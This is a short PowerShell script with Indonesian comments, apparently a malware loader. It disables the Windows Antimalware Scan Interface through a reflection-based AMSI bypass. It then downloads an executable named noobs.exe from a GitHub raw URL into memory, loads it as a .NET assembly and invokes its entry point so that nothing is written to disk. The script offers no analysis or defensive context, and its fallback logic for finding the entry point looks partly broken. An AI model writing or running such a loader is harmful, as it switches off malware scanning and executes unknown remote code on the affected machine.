# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Download file .exe ke memory
$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Load .NET assembly dari memory
[System.Reflection.Assembly]::Load($bytes)

# Cari entry point (method Main)
$entry = [System.Reflection.Assembly]::GetEntryAssembly()
if ($entry -eq $null) {
    # fallback: ambil assembly terakhir
    $asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like '*noobs*' } | Select-Object -First 1
    if ($asm) { $entry = $asm.EntryPoint }
}

if ($entry) {
    $entry.Invoke($null, @())
} else {
    # coba jalankan method Main dari tipe yang sesuai
    $type = [System.Reflection.Assembly]::GetCallingAssembly().GetTypes() | Where-Object { $_.GetMethod('Main') -ne $null } | Select-Object -First 1
    if ($type) {
        $method = $type.GetMethod('Main', [System.Reflection.BindingFlags] 'Static, Public, NonPublic')
        $method.Invoke($null, @())
    }
}
